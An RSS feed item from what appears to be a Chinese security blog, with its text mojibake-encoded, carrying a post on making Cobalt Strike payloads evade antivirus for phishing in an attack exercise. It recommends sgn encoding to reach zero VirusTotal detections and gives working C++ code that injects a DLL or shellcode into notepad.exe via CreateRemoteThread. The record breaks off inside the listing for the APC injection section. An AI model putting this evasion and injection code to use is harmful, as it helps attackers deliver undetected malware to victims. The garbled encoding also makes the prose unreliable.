<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>shutTD</title>
        <subtitle>Cyber AD</subtitle>
        <icon>https://shut-td.github.io/images/favicon.ico</icon>
        <link>https://shut-td.github.io</link>
        <author>
          <name>shutTD</name>
        </author>
        <description>èœåªå› ~</description>
        <language>zh-CN</language>
        <pubDate>Tue, 16 Jul 2024 10:13:27 +0800</pubDate>
        <lastBuildDate>Tue, 16 Jul 2024 10:13:27 +0800</lastBuildDate>
        <category term="ikun~" />
        <category term="UnTivirus" />
        <item>
            <guid isPermalink="true">https://shut-td.github.io/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/</guid>
            <title>CSè¿œæ§å…æ€æ€è·¯ä¸å®ç°</title>
            <link>https://shut-td.github.io/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/</link>
            <category term="å…æ€" scheme="https://shut-td.github.io/categories/%E5%85%8D%E6%9D%80/" />
            <category term="å…æ€" scheme="https://shut-td.github.io/tags/%E5%85%8D%E6%9D%80/" />
            <pubDate>Tue, 16 Jul 2024 10:13:27 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;csåŸç”Ÿshellcodeä¸Šçº¿å…æ€&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csåŸç”Ÿshellcodeä¸Šçº¿å…æ€&#34;&gt;#&lt;/a&gt; CS åŸç”Ÿ shellcode ä¸Šçº¿å…æ€&lt;/h3&gt;
&lt;p&gt;æœ€è¿‘æ”»é˜²åœ¨å³æ‰€ä»¥æƒ³è¦å°è¯•å†™å…æ€ğŸé’“é’“é±¼ï¼Œæ‰€ä»¥å°å­¦äº†ä¸€æ‰‹ä¸€äº›æ¯”è¾ƒå¥½ç”¨ä¸”å…æ€æ•ˆæœæ¯”è¾ƒå¥½çš„æ‰‹æ³•åšä¸€ä¸‹æ€»ç»“ï¼Œä»å‡ ä¸ªè§’åº¦å»ç»„åˆå…æ€ã€‚&lt;/p&gt;
&lt;h5 id=&#34;shellcodeå…æ€&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shellcodeå…æ€&#34;&gt;#&lt;/a&gt; shellcode å…æ€&lt;/h5&gt;
&lt;p&gt;sgn ç¼–ç  (å†…å­˜è‡ªè§£å¯†)ï¼Œå¯ä»¥å¾ˆå¥½çš„åšåˆ°é™æ€å…æ€çš„æ•ˆæœä¸éœ€è¦åšå…¶ä»–ä»»ä½•åŠ å¯†æ‰‹æ®µå³å¯åšåˆ°é™æ€å…æ€ï¼Œå¯ä»¥å°è¯• sgn ç¼–ç åä¼  vt ä¸€èˆ¬å°±æ˜¯ 0 æŸ¥æ€ã€‚&lt;/p&gt;
&lt;p&gt;ç”¨æ³•ï¼šå°† shellcode äºŒè¿›åˆ¶æ–‡ä»¶ä¾‹å¦‚ xx.bin ä¿å­˜ï¼Œä½¿ç”¨ sgn.exe è¿›è¡Œç¼–ç ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç³»ç»Ÿä½æ•°è¦å¯¹&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;åŸå§‹ shellcode&lt;/strong&gt; (ç”¨ winhex ç­‰äºŒè¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€):&lt;img data-src=&#34;https://dlink.host/wx4.sinaimg.cn/large/008DfUDOly8hrpo6edkdoj30hk0drwk8.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;strong&gt;sgn è¿›è¡Œç¼–ç &lt;/strong&gt;:&lt;img data-src=&#34;https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpo6it3a1j30v10apmyj.jpg&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
&lt;strong&gt; ç¼–ç åçš„ shellcode&lt;/strong&gt;:&lt;img data-src=&#34;https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpo6ptt93j30rs0t819n.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;è¿™ç§é™æ€å…æ€æ•ˆæœå¾ˆå¥½åŸºæœ¬ä¸Šæ— éœ€åšå…¶ä»–ä»»ä½•åŠ å¯†å¤„ç†ï¼ŒåŒæ—¶è¿˜åšåˆ°äº†é™ç†µï¼Œå½“ç„¶è¿™é‡Œè¿˜å¯ä»¥å°†äºŒè¿›åˆ¶æ–‡ä»¶æ‰˜ç®¡åˆ°æœåŠ¡å™¨ä¸Šç„¶åé€šè¿‡ http è¯·æ±‚æ¥è·å– shellcodeï¼Œä¹Ÿå¯ä»¥é…åˆå›¾ç‰‡éšå†™è¿›è¡Œ shellcode çš„éšè—ã€‚&lt;/p&gt;
&lt;h4 id=&#34;ä»£ç ä¸è¿›ç¨‹æ³¨å…¥æ‰‹æ³•&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ä»£ç ä¸è¿›ç¨‹æ³¨å…¥æ‰‹æ³•&#34;&gt;#&lt;/a&gt; ä»£ç ä¸è¿›ç¨‹æ³¨å…¥æ‰‹æ³•&lt;/h4&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;CreateRemoteThread (è¿œç¨‹çº¿ç¨‹æ³¨å…¥)&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
 æ³¨å…¥æµç¨‹ï¼š&lt;br /&gt;
1ã€æ ¹æ®è¿›ç¨‹åå¯»æ‰¾ pidï¼Œç”¨äºåç»­è¿›ç¨‹æ³¨å…¥&lt;br /&gt;
 2ã€æ ¹æ® pid æ‰“å¼€æŒ‡å®šè¿›ç¨‹å¥æŸ„&lt;br /&gt;
 3ã€å‘æŒ‡å®šè¿›ç¨‹ç”³è¯·å¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜åŒºåŸŸ&lt;br /&gt;
 4ã€å°† shellcode æˆ– dll æ³¨å…¥åˆ°è¯¥å†…å­˜åŒºåŸŸä¸­&lt;br /&gt;
 5ã€å¼€è¾Ÿä¸€ä¸ªæ–°çº¿ç¨‹æ‰§è¡Œ&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;Tlhelp32.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;DWORD &lt;span class=&#34;title&#34;&gt;GetProcessIdByName&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(LPCTSTR lpszProcessName)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hSnapshot = &lt;span class=&#34;built_in&#34;&gt;CreateToolhelp32Snapshot&lt;/span&gt;(TH32CS_SNAPPROCESS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (hSnapshot == INVALID_HANDLE_VALUE)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PROCESSENTRY32 pe;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pe.dwSize = &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; pe;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;Process32First&lt;/span&gt;(hSnapshot, &amp;amp;pe))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;lstrcmpi&lt;/span&gt;(lpszProcessName, pe.szExeFile) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hSnapshot);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; pe.th32ProcessID;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;Process32Next&lt;/span&gt;(hSnapshot, &amp;amp;pe));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hSnapshot);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; path[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;C:\\xxx\\TestDll.dll&amp;quot;&lt;/span&gt;;   &lt;span class=&#34;comment&#34;&gt;//dllæ³¨å…¥&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; shellcode[] = &amp;#123;\x12&amp;#125;;  &lt;span class=&#34;comment&#34;&gt;//shellcodeæ³¨å…¥ &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;DllInjectMain&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//dllæ³¨å…¥&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hProcess = &lt;span class=&#34;built_in&#34;&gt;OpenProcess&lt;/span&gt;(PROCESS_ALL_ACCESS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;GetProcessIdByName&lt;/span&gt;((LPCTSTR)&lt;span class=&#34;string&#34;&gt;&amp;quot;notepad.exe&amp;quot;&lt;/span&gt;));    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LPVOID lpBaseAddress = &lt;span class=&#34;built_in&#34;&gt;VirtualAllocEx&lt;/span&gt;(hProcess, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;WriteProcessMemory&lt;/span&gt;(hProcess, lpBaseAddress, path, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(path), &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LPTHREAD_START_ROUTINE pLoadlibrary = (LPTHREAD_START_ROUTINE)&lt;span class=&#34;built_in&#34;&gt;GetProcAddress&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;GetModuleHandleA&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;), &lt;span class=&#34;string&#34;&gt;&amp;quot;LoadLibraryA&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CreateRemoteThread&lt;/span&gt;(hProcess, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, (LPTHREAD_START_ROUTINE)pLoadlibrary, lpBaseAddress, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ShellcodeInjectMain&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;   &lt;span class=&#34;comment&#34;&gt;//shellcodeæ³¨å…¥&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      HANDLE hProcess = &lt;span class=&#34;built_in&#34;&gt;OpenProcess&lt;/span&gt;(PROCESS_ALL_ACCESS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;GetProcessIdByName&lt;/span&gt;((LPCTSTR)&lt;span class=&#34;string&#34;&gt;&amp;quot;notepad.exe&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      LPVOID lpBaseAddress = &lt;span class=&#34;built_in&#34;&gt;VirtualAllocEx&lt;/span&gt;(hProcess, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;(æˆ–è€…&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; shellcdoe), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;WriteProcessMemory&lt;/span&gt;(hProcess, lpBaseAddress, shellcode, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode), &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;CreateRemoteThread&lt;/span&gt;(hProcess, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, (LPTHREAD_START_ROUTINE)lpBaseAddress, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 è¿™ç§ç›´æ¥çš„çº¿ç¨‹æ³¨å…¥å®¹æ˜“æš´æ¯™ï¼Œå»ºè®®æ­é…å…¶ä»–æ‰‹æ®µé£Ÿç”¨ã€‚&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;APC Injection (APC æ³¨å…¥)&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
 æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„ APC é˜Ÿåˆ—ï¼Œåº”ç”¨ç¨‹åºé€šè¿‡è°ƒç”¨&lt;strong&gt; QueueUserAPC&lt;/strong&gt; å‡½æ•°å°† APC æ’é˜Ÿåˆ°çº¿ç¨‹ä¸­ï¼Œè°ƒç”¨çº¿ç¨‹åœ¨å¯¹&lt;strong&gt; QueueUserAPC&lt;/strong&gt; çš„è°ƒç”¨ä¸­æŒ‡å®š APC å‡½æ•°çš„åœ°å€ï¼Œå½“ APC æ’é˜Ÿåˆ°çº¿ç¨‹ä¸­æ—¶ï¼Œç³»ç»Ÿä¼šå‘å‡ºè½¯ä»¶ä¸­æ–­ã€‚ä¸‹æ¬¡è°ƒåº¦çº¿ç¨‹æ—¶ï¼Œå®ƒå°†è¿è¡Œ APC åŠŸèƒ½ã€‚&lt;br /&gt;
æ³¨å…¥æµç¨‹ï¼š&lt;br /&gt;
1ã€æ ¹æ®è¿›ç¨‹åç¡®å®š pid&lt;br /&gt;
2ã€é€šè¿‡ pid éå† tid&lt;br /&gt;
3ã€æ’å…¥ APC é˜Ÿåˆ—&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span 